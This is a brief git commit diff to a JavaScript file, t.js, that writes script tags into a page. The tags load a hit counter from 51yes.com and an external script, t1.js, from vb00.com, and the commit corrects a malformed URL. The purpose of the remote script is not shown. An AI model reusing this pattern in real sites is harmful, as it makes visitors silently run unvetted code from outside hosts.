958f48e1f5e0d5d512c2d174033879e760e28568
tzjs <tzjs@gmx.com>
2015-12-26 11:41:00 +0800

    Update t.js

--- 8/t.js
+++ 8/t.js
@@ -1,3 +1,5 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=389076363&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\t.vb00.com\/t1.js ><\/script>");
+
+
+document.writeln("<script src=http:\/\/t.vb00.com\/t1.js ><\/script>");
